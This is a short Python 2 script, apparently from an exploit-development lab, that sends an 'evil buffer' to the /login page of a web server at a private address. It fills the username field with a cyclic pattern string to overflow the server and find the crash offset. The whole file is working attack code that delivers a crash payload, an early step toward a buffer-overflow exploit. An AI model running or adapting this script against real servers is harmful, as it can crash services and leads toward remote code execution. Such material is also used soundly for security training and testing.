#!/usr/bin/python
import socket
import time
import sys

size = 100
try:
    print "\nSending evil buffer "
    inputBuffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9" \
                  "Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9" \
                  "Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9" \
                  "Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9" \
                  "Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9" \
                  "Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9" \
                  "Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9" \
                  "Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9" \
                  "Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9" \
                  "Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9" \
                  "Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9" \
                  "Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9" \
                  "Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9" \
                  "An0An1An2An3An4An5An6An7An8An9" \
                  "Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9" \
                  "Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9" \
                  "Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9" \
                  "Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9" \
                  "As0As1As2As3As4As5As6As7As8As9" \
                  "At0At1At2At3At4At5At6At7At8At9" \
                  "Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9" \
                  "Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9" \
                  "Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9" \
                  "Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9" \
                  "Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9" \
                  "Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9" \
                  "Ba0Ba1Ba2Ba3Ba4Ba5Ba "
    content = "username=" + inputBuffer + "&password=A"
    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 192.168.196.10\r\n"
    buffer += "User - Agent: Mozilla / 5.0 (X11; Linux_86_64; rv: 52.0) Gecko / 20100101Firefox / 52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://192.168.196.10/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: " + str(len(content)) + "\r\n"
    buffer += "\r\n"
    buffer += content
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.196.10", 80))
    s.send(buffer)
    s.close()
    print "\nDone!"
except:
    print "Could not connect!"
